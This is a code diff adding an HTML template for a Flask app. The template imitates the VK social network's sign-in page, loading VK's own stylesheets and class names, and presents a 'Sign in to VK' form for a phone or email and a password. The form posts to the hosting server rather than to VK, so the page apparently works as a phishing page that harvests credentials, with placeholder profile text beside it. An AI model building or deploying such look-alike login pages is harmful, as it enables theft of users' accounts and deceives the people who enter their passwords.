@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <link type="text/css" rel="stylesheet" href="https://st1-99.vk.com/css/al/common.910ab324010948c3f552.css" /><link type="text/css" rel="stylesheet" href="https://st1-99.vk.com/css/al/base.fb1f9176f1f18f31fafa.css" /><link type="text/css" rel="stylesheet" href="https://st1-99.vk.com/css/al/vkui.6fc5f769d34bd7686a9a.css" /><link type="text/css" rel="stylesheet" href="https://st1-99.vk.com/css/al/fonts_utf.2546d253c69649b0561c.css" /><link type="text/css" rel="stylesheet" href="https://st1-99.vk.com/css/al/fonts_cnt.a289ed70815ffbd082ae.css" />
+
+  <style>
+      .split {
+      height: 100%;
+      width: 50%;
+      position: fixed;
+      z-index: 1;
+      top: 0;
+      overflow-x: hidden;
+
+    }
+
+    /* Control the left side */
+    .left {
+      left: 0;
+      background-color: #EBE981;
+    }
+
+    /* Control the right side */
+    .right {
+      right: 0;
+      background-color: #141414;
+    }
+
+    /* If you want the content centered horizontally and vertically */
+    .centered {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+    }
+
+    /* Style the image inside the centered container, if needed */
+    .centered img {
+      width: 150px;
+      border-radius: 50%;
+    }
+    
+    .ramka {
+      margin-top: 7.5%;
+      margin-left:7.5%;
+      margin-bottom:7.5%;
+      margin-right:7.5%;
+      background-color:#222222;
+      width: 85%;
+      height: 85%;
+      border-top-left-radius: 10%;
+      border-top-right-radius: 10%;
+      border-bottom-right-radius: 10%;
+      border-bottom-left-radius: 10%;
+    }
+    .center {
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+      width: 50%;
+      padding-top:10%;
+      max-width: 17.5%;
+      height: auto;
+    }
+    .VkIdForm__header {
+      font-size: 20px;
+      line-height: 24px;
+      text-align: center;
+      margin-top: 16px;
+      margin-bottom: 20px;
+      font-weight: 500;
+      font-family: var(--vk-sans-display);
+    }
+    .VkIdForm__input {
+      box-sizing: border-box;
+      width: 100%;
+      height: 36px;
+      padding: 8px 12px;
+      line-height: 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid var(--white_);
+      text-overflow: ellipsis;
+      background-color: var(--gray_800);
+      color: var(--gray_100);
+    }
+    .log_in_to_VK {
+      margin-top:3%; 
+      width:80%; 
+      height: 36px;
+      margin-left:10%;
+      margin-right:10%;
+      border-radius: 8px;
+      font-size: 15px;
+      line-height: 24px;
+         
+    }
+  </style>
+  
+</head>
+<body>
+  <div class="split left">
+    <div class="centered">
+      <img src="img_avatar2.png" alt="Avatar woman">
+      <h2>Jane Flex</h2>
+      <p>Some text.</p>
+    </div>
+  </div>
+  
+  <div class="split right">
+    <div class="ramka">
+      <form method="post">
+        <img class="center" src="{{ url_for('static', filename='vkicon.png') }}" width="10%" alt="Avatar woman">
+        <div class="VkIdForm__header" style="font-size: 225%; color:white; padding-top:2.5%;" >Sign in to VK</div>
+        <div style="padding-top:0%; padding-left:10%; padding-right:10%;">
+          <input type="text" class="VkIdForm__input" name="email" id="index_email" value="" placeholder="Phone or email" autocomplete="username">
+        </div>
+        <div style="padding-top:3%; padding-left:10%; padding-right:10%;">
+          <input type="password" class="VkIdForm__input" name="passwd" id="index_email" value="" placeholder="Password" autocomplete="username">
+        </div>
+        <button class="log_in_to_VK" type="submit"  >
+          <span>
+            <span>Sign in</span>
+          <span>
+        </button>
+      </form>
+    
+  </div> 
+</body>
+</html>
+  
